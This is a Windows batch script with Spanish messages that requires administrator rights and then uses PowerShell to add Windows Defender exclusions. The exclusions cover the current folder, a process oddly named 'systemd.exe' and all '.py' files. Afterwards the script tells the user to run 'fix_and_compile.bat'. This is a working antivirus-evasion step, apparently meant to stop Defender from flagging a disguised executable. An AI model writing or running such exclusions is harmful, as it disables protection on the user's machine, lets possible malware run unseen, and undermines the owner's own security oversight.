@echo off
echo ========================================
echo   AGREGAR EXCLUSION EN WINDOWS DEFENDER
echo ========================================
echo.

REM Verificar si se ejecuta como administrador
net session >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [!] ERROR: Este script requiere permisos de Administrador
    echo [*] Click derecho en el archivo y selecciona "Ejecutar como administrador"
    pause
    exit /b 1
)

echo [*] Agregando exclusiones en Windows Defender...
echo.

REM Agregar carpeta completa
powershell -Command "Add-MpPreference -ExclusionPath '%CD%'"
echo [+] Carpeta agregada: %CD%

REM Agregar proceso
powershell -Command "Add-MpPreference -ExclusionProcess 'systemd.exe'"
echo [+] Proceso agregado: systemd.exe

REM Agregar extension
powershell -Command "Add-MpPreference -ExclusionExtension '.py'"
echo [+] Extension agregada: .py

echo.
echo ========================================
echo   EXCLUSIONES AGREGADAS
echo ========================================
echo.
echo [+] Windows Defender ya no bloqueara archivos en esta carpeta
echo [*] Ahora puedes ejecutar: fix_and_compile.bat
echo.
pause
